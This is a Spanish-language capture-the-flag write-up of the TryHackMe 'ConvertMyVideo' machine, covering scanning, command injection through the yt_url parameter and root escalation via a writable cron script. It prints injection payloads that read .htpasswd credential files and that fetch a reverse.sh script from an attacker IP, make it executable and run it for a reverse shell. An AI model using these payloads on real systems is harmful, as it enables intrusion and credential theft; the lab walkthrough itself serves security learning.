---
layout: single
title: ConvertMyVideo - TryHackMe
excerpt: "Debemos encontrar 1 bandera. Primero, a partir de un escaneo de puertos pude saber que había un servidor web que alojaba una aplicación web que constaba de un formulario con un campo asociado a la funcionalidad de convertir videos en archivos de audio en formato MP3. Además, el campo del formulario aceptaba como valor el identificador del video. Luego, a partir del análisis de un script JavaScript insertado en el código fuente, se logró saber que el identificador del video era incorporado en una URL dentro de un parámetro llamado `yt_url` que formaba parte de la solicitud POST. Ademas,se supo que el cuerpo de la respuesta estaba en formato JSON, y el valor de una clave era reflejada en la página de la aplicación web. Se logro inyectar comandos en el parámetro `yt_url` de la solicitud POST con el fin de observar los resultados en el valor de la clave “output” de la data JSON de la respuesta HTTP. Mediante esta vulnerabilidad se logró ejecutar una reverse Shell. Luego, en la escalada vertical, aproveche que un script ejera ejecutado de manera periodica y automatizada con los privilegios de root."
date: 2024-01-02	
classes: wide
header:
  teaser: /assets/images/Youtube1/image003.png
  teaser_home_page: true
  icon: /assets/images/descarga7.webp
categories:
  - TryHackMe
  - ctf
tags:
  - Linux  
  - OpenVPN
  - Nmap
  - Command Injection
  - JavaScript
  - jQuery
  - Burp Suite
  - John The Ripper
  - Hashcat
  - HTML
  - HTTP
  - pspy64
---

![](/assets/images/Youtube1/image001.png)

## SUMMARY

Debemos encontrar 1 bandera. Primero, a partir de un escaneo de puertos pude saber que había un servidor web que alojaba una aplicación web que constaba de un formulario con un campo asociado a la funcionalidad de convertir videos en archivos de audio en formato MP3. Además, el campo del formulario aceptaba como valor el identificador del video. Luego, a partir del análisis de un script JavaScript insertado en el código fuente, se logró saber que el identificador del video era incorporado en una URL dentro de un parámetro llamado `yt_url` que formaba parte de la solicitud POST. Ademas,se supo que el cuerpo de la respuesta estaba en formato JSON, y el valor de una clave era reflejada en la página de la aplicación web. Se logro inyectar comandos en el parámetro `yt_url` de la solicitud POST con el fin de observar los resultados en el valor de la clave “output” de la data JSON de la respuesta HTTP. Mediante esta vulnerabilidad se logró ejecutar una reverse Shell. Luego, en la escalada vertical, aproveche que un script ejera ejecutado de manera periodica y automatizada con los privilegios de root.

## FASE RECONOCIMIENTO ACTIVO
En este caso debemos acceder al sistema destino y obtener la bandera. Primero, empezaremos utilizando el comando openvpn y el archivo de configuración OpenVPN con el fin de establecer una conexión VPN y poder acceder a los laboratorios donde están las máquinas virtuales y vulnerables.

![](/assets/images/Youtube1/image005.png)

Además, la plataforma de Tryhackme nos muestra la dirección IP de la máquina ConvertMyVideo.

![](/assets/images/Youtube1/image007.png)

## FASE ESCANEO Y ENUMERACION
Ahora pasaremos a la fase de Escaneo y Enumeración con el fin de poder escanear los puertos del sistema destino. Además, obtendremos los servicios que se han levantado en los puertos abiertos, las versiones de los servicios, y el sistema operativo del sistema destino.

![](/assets/images/Youtube1/image009.png)

Los resultados que obtenemos son:
- Un programa servidor SSH que se ejecuta en el puerto 22.
- Un programa servidor HTTP que se ejecuta en el puerto 80, y que aloja un sitio web.

Ahora observaremos las caracteristicas y funcionalidades que pueda presentar el sitio web desde mi navegador web.

![](/assets/images/Youtube1/image011.png)

![](/assets/images/Youtube1/image013.png)

![](/assets/images/Youtube1/image015.png)

Podemos observar que logramos encontrar una etiqueta o eemento HTML script para vincular un archivo JavaScript externo. Ademas, si analizamos el contenido de tal archivo JavaScript nos topamos con alguna parte de la logica seguida para convertir los videos de Youtube en archiivos de audio en formato MP3. Esta logica consiste en enviar una solicitud POST con un parametro llamado “yt_url” que va contener una URL con un parametro GET “v” cuyo valor va ser el que ingresamos en el campo “ytid”. Luego, la respuesta de esta solicitud, su cuerpo va estar en formato JSON, y se extraera el valor de la clave status con el fin de compararlo con el valor 0 y 1. Si es “0”, se establecera un elmento de anclaje con un mensaje “Download MP3” que va tener una URL habilitada. Caso contrario, se establecer un mensaje de error.

Ahora lo que se me viene a la mente es capturar la respuesta HTTP del servidor con su cuerpo en formato JSON para poder observar todas los pares clave-valor. Para ello utilizaremos Burp Suite.

![](/assets/images/Youtube1/image017.png)

![](/assets/images/Youtube1/image019.png)

![](/assets/images/Youtube1/image021.png)

![](/assets/images/Youtube1/image023.png)

Podemos observar que la data consta de varias claves con sus respectivos, y alteramos el valor de la clave status a “0” con el fin de obtener el elemento anclaje con el mensaje “Download MP3” y con una URL para descargar el audio en formato MP3.

## FASE GANAR ACCESO O EXPLOTACION O HACKING
Ahora intentaremos modificar la URL del parametro yt_url con el fin de poder saber si podemos obtener otros valores en las demas claves.

```
Payload: yt_url=https://www.youtube.com/watch?v=11;id;
```
![](/assets/images/Youtube1/image025.png)

```
Payload: yt_url=https://www.youtube.com/watch?v=11;ls -la;
```
![](/assets/images/Youtube1/image027.png)

Podemos observar que logramos visualizar el resultado del comando “id” en el valor de la clave “output”. Por lo tanto, esta funcionalidad de conversion de videos a archivos de audio en formato MP3 es vulnerable a Command Injection. Ademas, podemos observar en el segundo payload probado, que hay un problema con los espacios en blanco que hay entre los argumentos de los comandos inyectados ya que no obtenemos el resultado esperado.

Ahora tendremos que buscar en Internet la manera de evitar usar espacios blancos entre comandos y sus argumentos.

![](/assets/images/Youtube1/image029.png)

![](/assets/images/Youtube1/image031.png)

Podemos observar que logramos solucionar el problemas de los epsacios en blanco con el uso de ${IFS}. Ademas, podemos observar que hay un directorio llamado admin, y un archivo oculto llamado “.htaccess” que viene a ser un archivo de configuracion en los servidores web que ejecutan el software Apache. Ademas, es usado para proteger directorios y sus subdirectorios con mecanismos de autenticacion como logins.

Ahora accedremos al directorio admin a traves de mi navegador web.

![](/assets/images/Youtube1/image033.png)

```
Payload: yt_url=https://www.youtube.com/watch?v=11;cat${IFS}/var/www/html/admin/.htaccess;
```
![](/assets/images/Youtube1/image035.png)

```
Payload: yt_url=https://www.youtube.com/watch?v=11;cat${IFS}/var/www/html/admin/.htpasswd;
```
![](/assets/images/Youtube1/image037.png)

Podemos observar que este directorio esta protegido por un mecanismo de autneitcacion que ha sido aplicado mediante una configuracion en el archivo “.htaccess”. Ademas, podemos observar la ruta hacia el archivo oculto “.httpasswd” que contiene las credenciales para autenticarse en el mecanismo de autenticacion, pero necesitamos crackear el hash para obtener el password en formato texto plano.

![](/assets/images/Youtube1/image039.png)

![](/assets/images/Youtube1/image041.png)

Como se puede observar no logre crackear el hash ni con John The Ripper ni con Hashcat, y desconozco la causa. Po ral razon, ejecutaremos un comando a traves de la vulnerabilidad Command Injection con el cargar un script Shell en el sistema destino, y luego ejecutarlo para generar una reverse shell.

```
Payload: yt_url=https://www.youtube.com/watch?v=11;wgett${IFS}http://10.8.123.194/reverse.sh;
Payload: yt_url=https://www.youtube.com/watch?v=11; chmod${IFS}777${IFS}reverse.sh;
Payload: yt_url=https://www.youtube.com/watch?v=11; ./reverse.sh;
```
![](/assets/images/Youtube1/image043.png)

![](/assets/images/Youtube1/image045.png)

De esta manera logramos ganar accesso al sistema destino. Ahora realizaremos un tratamiento de la reverse shell para que sea mas estable e interactiva.

![](/assets/images/Youtube1/image047.png)

## FASE ESCALADA PRIVILEGIOS
Ahora es momento de buscar vectores de escalada de privilegios vertical en el sistema de archivos de manera manual.

![](/assets/images/Youtube1/image049.png)

![](/assets/images/Youtube1/image051.png)

Luego, de enumerar los vectores de escalada de privilegios mas comunes como los archivos con el bit SUID habilitado, las tareas cron, la version del sudo,..etc. Me encontre con un script Shell que era ejecutado de manera periodica y automatizada con los pirivilegios de root. Ademas, tenemos los permisos de escritura sobre el por lo que podemos modificar su contenido con el fin de ejecutar una reverse shell con los priivlegios de root.

![](/assets/images/Youtube1/image053.png)

![](/assets/images/Youtube1/image055.png)

![](/assets/images/Youtube1/image057.png)

De esta manera realizamos una escalada de privilegio vertical siendo el usuario root, y logramos obtener la flag. 











